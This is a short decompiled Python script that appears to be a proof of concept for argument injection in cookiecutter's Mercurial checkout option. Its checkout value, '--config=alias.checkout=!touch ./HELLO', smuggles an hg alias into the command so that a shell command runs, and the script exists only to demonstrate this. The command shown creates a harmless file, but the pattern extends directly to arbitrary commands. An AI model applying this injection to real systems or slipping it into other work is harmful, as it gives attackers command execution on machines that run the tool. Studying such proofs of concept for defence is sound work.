# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 437_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 200 bytes
from cookiecutter.main import cookiecutter
checkout = "--config=alias.checkout=!touch ./HELLO"
cookiecutter("some valid hg repository", checkout=checkout)

# okay decompiling 437_1.pyc
